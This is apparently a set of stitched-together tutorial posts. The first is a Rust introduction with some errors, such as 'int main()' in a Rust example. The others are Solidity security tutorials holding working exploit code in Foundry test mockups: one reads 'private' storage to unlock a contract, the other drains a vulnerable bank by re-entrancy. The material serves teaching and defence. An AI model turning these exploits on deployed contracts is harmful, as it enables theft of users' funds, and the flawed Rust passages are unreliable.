# Get started

The most useful resource to kickstart rust development is [Rust book](https://doc.rust-lang.org/book)

## Linux, MacOS, or WSL2 Linux Distro

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

You should now be equipped with:

- [`rustup`](https://rust-lang.github.io/rustup/) - Toolchain manager for rust programmign language, it enables you to switch between or update `rustc` & `cargo`.
- [`cargo`](https://doc.rust-lang.org/cargo/) - The package manager for rust, similar to what `yarn` or `npm` do for `node.js`.
- [`rustc`](https://doc.rust-lang.org/stable/rustc/) - The rust compiler, it producees binary code from your source code. This is similar `gcc/g++` for C++, most of the time you don't invoke it directly but rather run & build rust program through a build tool (like `cmake`). For rust, our friend is `cargo`.

## Windows

Download the installer by following [this instruction](https://www.rust-lang.org/tools/install). You should be ready in no time.

## Build from source

Clone the rustup repo [here](https://github.com/rust-lang/rustup). If you didn't have `cargo`, double check `rustup-init.sh` script, execute it, then `cargo run --release`, else just run the command. More info [here](https://rust-lang.github.io/rustup/installation/other.html#msvc). **Becareful! This will supersede any pre-existing tools chains**.

# First glance

We will scan through some important concepts of Rust. A good reference is [Rust standard library](https://doc.rust-lang.org/stable/std)

## String

At least multiple types of strings in Rust.

1. `str` - string slice, we don't normally use this, [refence here](https://doc.rust-lang.org/std/primitive.str.html)
2. `&str` - borrowed string slice, made up of a pointer to an array of bytes. Data in `&str` is immutable. String CAN'T be index by
   character position (because Unicode characters may contain multiple bytes, what display is unicode graphemes instead of scalar/utf-8).
3. `String` - a vector of bytes, contains data, len, and capacity. Data in `String` is mutable.

| Example  | Description       | Rules |
| -------- | ----------------- | ----- |
| $value   | Lowercase         |     |
| $Value   | Uppercase         |     |
| $\_value | Underscore        |     |
| $1value  | Start from number |     |

## Ownership

Rust use Ownership and RAII to manage memory, no garbage collector is used => bare metal speed

There are 3 rules regarding ownership:

1. Each value has an owner
2. Only one owner - it can be borrowed.
3. If lifetime of value expired (go out of scope), it ownership is dropped.

An example of ownership:

```rust
int main() {
  let s1 = String::from("hello"); // Initialize and given ownership of this string
  let s2 = s1; // Value is moved here // ownership is transferred to s2.
  // println!("{}", s1); // Invalid since s2 ownerd the value now
  println!("{}", s2); // This is ok
}
```

## Pointer, Box & Smart pointers

All values in Rust are stack allocated by default (continuous, high-speed access, [more info](https://www.guru99.com/stack-vs-heap.html)).
Stack size is fixed so compilation wouldn't work for recusive data structures such as Linkedlists, Array, etc.. where
data size is unknown at compilation time.

Thus smart pointers are needed. 
For example, values can be boxed and allocates on the heap with `std::Box<T>`. A box is a pointer with automatic mememory management feature (hence *smart* pointer) to a heap value of type `T`.
- Conceptualize by C++, inspired from Simula67 `element` - a pointer without `null` ([history](https://en.wikipedia.org/wiki/Smart_pointer#history)).
- For example, in C++11, `std::unique_ptr<Type> Func()` makes explicit that caller should takes ownership of the result, and C++ runtime ensures that memory will be reclaimed automatically.
- <strong>For Rust, </strong> a smart pointer is defined mostly as a struct that
  implements `Deref` - , `Drop` traits. The concept is well described in [official
  book](https://doc.rust-lang.org/book/ch15-00-smart-pointers.html). You may find this [explanation](https://youtu.be/KYJ95TxEC18) helpful.

An example of `Box` from the book, noticing box always takes 8 bytes.

```rust
use std::mem;

#[allow(dead_code)]
#[derive(Debug, Clone, Copy)]
struct Point {
    x: f64,
    y: f64,
}

// A Rectangle can be specified by where its top left and bottom right corners are in space
#[allow(dead_code)]
struct Rectangle {
    top_left: Point,
    bottom_right: Point,
}

fn origin() -> Point {
    Point { x: 0.0, y: 0.0 }
}

fn boxed_origin() -> Box<Point> {
    // Allocate this point on the heap, and return a pointer to it
    Box::new(Point { x: 0.0, y: 0.0 })
}

fn main() {
    // Stack allocated variables
    let point: Point = origin();
    let rectangle: Rectangle = Rectangle {
        top_left: origin(),
        bottom_right: Point { x: 3.0, y: -4.0 }
    };

    // Heap allocated rectangle
    let boxed_rectangle: Box<Rectangle> = Box::new(Rectangle {
        top_left: origin(),
        bottom_right: Point { x: 3.0, y: -4.0 },
    });

    // The output of functions can be boxed
    let boxed_point: Box<Point> = Box::new(origin());

    // Double indirection
    let box_in_a_box: Box<Box<Point>> = Box::new(boxed_origin());

    println!("Point occupies {} bytes on the stack",
             mem::size_of_val(&point));
    println!("Rectangle occupies {} bytes on the stack",
             mem::size_of_val(&rectangle));

    // box size == pointer size
    println!("Boxed point occupies {} bytes on the heap",
             mem::size_of_val(&boxed_point));
    println!("Boxed rectangle occupies {} bytes on the heap",
             mem::size_of_val(&boxed_rectangle));
    println!("Boxed box occupies {} bytes on the heap",
             mem::size_of_val(&box_in_a_box));

    // Copy the data contained in `boxed_point` into `unboxed_point`
    let unboxed_point: Point = *boxed_point;
    println!("Unboxed point occupies {} bytes on the stack",
             mem::size_of_val(&unboxed_point));
}
```

```bash
Output >>

Point occupies 16 bytes on the stack
Rectangle occupies 32 bytes on the stack
Boxed point occupies 8 bytes on the heap
Boxed rectangle occupies 8 bytes on the heap
Boxed box occupies 8 bytes on the heap
Unboxed point occupies 16 bytes on the stack
```

# References

1. [O'Reilly rust crash course](https://learning.oreilly.com/videos/ultimate-rust-crash/9781800563902/)

# Problem introduction

In Solidity, you can define private variables in a contract to keep them hidden from other contracts.
Private variables are only accessible within the contract in which they are defined and cannot be accessed
or modified by other contracts or external users. This behavior is expected from programming languages which support OOP paradigm.

However, it's important to note that private variables are still visible to all participants on the blockchain, including miners and nodes.
This means that the values of private variables are not completely hidden,
and should not be used to store sensitive information such as passwords or private keys.

# An example

We will showcase an exploitation example in Foundry-VM.

## The Locker contract

Let's defined a `Locker` contract with 16bytes `secretKey` as below:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Locker {
  bool public locked = true; // 1 bytes
  bytes16 private secretKey; // 16 bytes

  constructor(bytes16 _secretKey) {
    secretKey = _secretKey;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(secretKey));
    locked = false;
  }
}

```

## Unlock

If we analyze [storage allocation](https://ethereum.org/en/developers/docs/smart-contracts/anatomy/#data) of the contract above, the result is:

<Image src="/blogs/blockchain/private_storage/storage.webp" width="1200" height="500" caption="Storage layout of Locker contract" />

Having that information in hand, an example unlocker would perform the following step:

1. Inspect the target contract
2. Load from contract storage slot 0
3. Extract `secretKey = bytes[15..30]` from the storage
4. Use the secret key to unlock.

An example mockup is implemented as follows:

```solidity
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "~/private_lock/Locker.sol"; // the defined Locker contract

contract LockerTest is Test {
  Locker public targetLocker;

  function setUp() public {
    bytes16 secretPhrase = bytes16(keccak256(abi.encodePacked(tx.origin, "SECRET_HASH")));
    targetLocker = new Locker(secretPhrase);
  }

  function breakSecret(Locker _targetLocker) internal view returns (bytes16) {
    // Step 1: Identify the contract
    address lockerAddress = address(_targetLocker);
    // Step 2: Retrieve storage data from at block 0 from the smart contract
    bytes32 secretDataBlock = vm.load(lockerAddress, bytes32(uint256(0)));

    // LAYOUT: 15 "0" | 16 (secretKey) | 1 ("locked" status) [SLOT 0]
    // Step 3: Retrieve byte 16th to 31th, which is the secret key.
    bytes16 secretKey = bytes16(secretDataBlock << (15 * 8));

    return secretKey;
  }

  function testUnlockLocker() public {
    // Step 4: Unlock
    bytes16 secretKey = breakSecret(targetLocker);
    targetLocker.unlock(secretKey);

    bool isUnlocked = !targetLocker.locked();
    assertTrue(isUnlocked, "Hacker should break the lock");
  }
}
```

# Prevention

A simple solution to make the contract more secured is using a pre-defined signature as the secret key.
For this example, I use elliptic curve DSA:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract SecureLocker {
  bool public locked = true; // 1 bytes
  address private owner;
  using ECDSA for bytes32;

  constructor(address _owner) {
    owner = _owner;
  }

  function unlock(bytes memory _signature) public {
    // EIP 712 Signature Validation: https://eips.ethereum.org/EIPS/eip-712
    bytes memory eth_msg = abi.encodePacked("\x19Ethereum Signed Message:\n20", "<SECRET_OFFCHAIN_MSG>");
    bytes32 hash = keccak256(eth_msg);
    if (owner == hash.recover(_signature)) {
      locked = false;
    }
  }
}
```

With this setup, the contract owner will store their signature (secret key) offchain and use it on `unlock` calls.

# References

1. [Ethernaut Level 12](https://ethernaut.openzeppelin.com/404)
2. [Ethereum storage layout](https://ethereum.org/en/developers/docs/smart-contracts/anatomy/#data)
3. [Ethereum OpCodes](https://ethereum.org/en/developers/docs/evm/opcodes/)

# Introduction

Re-entrancy attacks are a type of security vulnerability that can occur in smart contracts on blockchain platforms.
This type of attack allows an attacker to repeatedly enter and exit a function in a smart contract,
while maintaining the same state and taking advantage of the contract's vulnerability to drain funds or cause other malicious actions.

## Common mistakes

Common mistakes that lead to re-entrancy vulnerability are:

1. Improper use of global state variables
2. Inadequate input validation
3. Use of external contracts without proper security checks
4. Improper use of mutex
5. Insufficient gas limits for functions

# An example

In this section, we will implement a mockup scenario for re-entrancy attack using [Foundry-rs](https://book.getfoundry.sh/)

## The Vulnerable Contract

Here's the `ReentranceBank`, a smart contract that support store and retrieve ether:

```solidity
// File: <root>/src/reentrance/ReentranceBank.sol
pragma solidity ^0.8.13;

contract ReentranceBank {
  mapping(address => uint256) public balances;

  function deposit() public payable {
    balances[msg.sender] = balances[msg.sender] + msg.value;
  }

  function balanceOf(address _who) public view returns (uint256) {
    return balances[_who];
  }

  function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
      (bool result, ) = msg.sender.call{ value: _amount }(""); // send ether to withdrawal
      require(result, "withdrawal false");
      unchecked {
        balances[msg.sender] -= _amount; // update balances state
      }
    }
  }

  receive() external payable {}
}
```

A critical error is sending ether (**_line 17_**) before updating the balances (**_line 20_**)

## Exploitation

Let's take the role of an exploiter, we will perform on attack in the following steps:

1. Gather some ether amounts
2. Create and deploy an exploiter contract
3. Deposit into the exploiter contract some amount of ether
4. Execute the exploiting function from exploiter contract
5. Exploiter contract now's drained the `ReentranceBank`, simply withdraw from it to complete the attack.

### The exploiter contract

```solidity
// File: <root>/src/reentrance/ReentranceAttack.sol
pragma solidity ^0.8.13;

// third-party dependencies
import "@openzeppelin/contracts/access/Ownable.sol";

abstract contract IReentrance {
  mapping(address => uint256) public balances;

  function deposit() external payable virtual;

  function withdraw(uint256 _amount) external virtual;
}

contract ReentranceAttack is Ownable {
  IReentrance public targetBank;
  uint256 initialDeposit;

  // Step 2: deploy the exploiter contract, with attacker being owner
  constructor(address challengeAddress) {
    targetBank = IReentrance(challengeAddress);
  }

  // Step 3-4: Implement exploitation flows to drain the bank
  function withdraw() external onlyOwner {
    uint256 balance = address(this).balance;
    (bool result, ) = msg.sender.call{ value: balance }("");
    require(result, "Withdrawal failed.");
  }

  function attack() external payable {
    // Step 1: Deposit some funds
    initialDeposit = msg.value;
    targetBank.deposit{ value: initialDeposit }();

    // Step 5: withdraw these funds.
    callWithdraw();
  }

  receive() external payable {
    // Funds will be withdraw multiple times due to re-entrancy calls.
    callWithdraw();
  }

  function callWithdraw() private {
    // this balance correctly updates after withdraw
    uint256 remainingBalance = address(targetBank).balance;

    if (remainingBalance > initialDeposit) {
      targetBank.withdraw(initialDeposit);
    } else if (remainingBalance > 0) {
      targetBank.withdraw(remainingBalance);
    }
  }
}
```

The exploit will happen at:

- `withdraw()` on **_line 25_**: entry point of our attack. The contract use `msg.sender.call{value: ...}` to prevent running out of gas (call stack can potentially be very large)
- `receive()` on **_line 40_**: it is a hook that being executed whenever this contract receive any ether
- `callWithdraw()` on **_line 45_**: drain the bank until it running out of ether.

### Exploitation flow mockup

With the exploiter contract defined above, we will mockup an attack scenario in Foundry VM environment.

```solidity
// File: <root>/test/reentrance/Reentrance.t.sol
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "~/reentrance/ReentranceBank.sol"; // use path remap <root>/src -> ~
import "~/reentrance/ReentranceAttack.sol";

contract ReentranceTest is Test {
  address depositor = vm.addr(1);
  address hacker = vm.addr(2);

  function setUp() public {
    // Deal EOA address some ether
    vm.deal(depositor, 100 ether);
    vm.deal(hacker, 1 ether);
  }

  // NOTE: `forge test` thread limit is 128
  function testReentranceAttack() public {
    ReentranceBank bankContract = new ReentranceBank();
    address bankAddress = address(bankContract);

    // Depositor deposits 100 ether into the bank.
    vm.prank(depositor);
    bankContract.deposit{ value: 2 ether }();

    // Hacker exploit the smart contract.
    vm.startPrank(hacker);
    ReentranceAttack exploiterContract = new ReentranceAttack(bankAddress);
    exploiterContract.attack{ value: 1 ether }();
    exploiterContract.withdraw();
    vm.stopPrank();

    assertEq(bankAddress.balance, 0 ether, "Bank balance should be zero");
    assertEq(hacker.balance, 3 ether, "Hacker should drain all money in the bank");
  }
}
```

